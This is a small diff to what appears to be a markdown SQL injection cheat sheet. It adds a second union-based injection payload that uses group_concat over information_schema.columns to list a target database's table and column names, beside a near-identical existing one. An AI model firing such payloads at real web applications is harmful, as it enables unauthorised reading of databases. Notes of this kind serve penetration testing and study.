@@ -14,6 +14,7 @@
   - column `schema_name` is database name
 Example union injection
 `... union select 1,2,group_concat(concat(table_name, ':', column_name)) from information_schema.columns where schema_name='interesting_db'`
+`... union select 1,2,group_concat(table_name, ':', column_name) from information_schema.columns where schema_name='interesting_db'`
 
 ## files
 ### check permissions
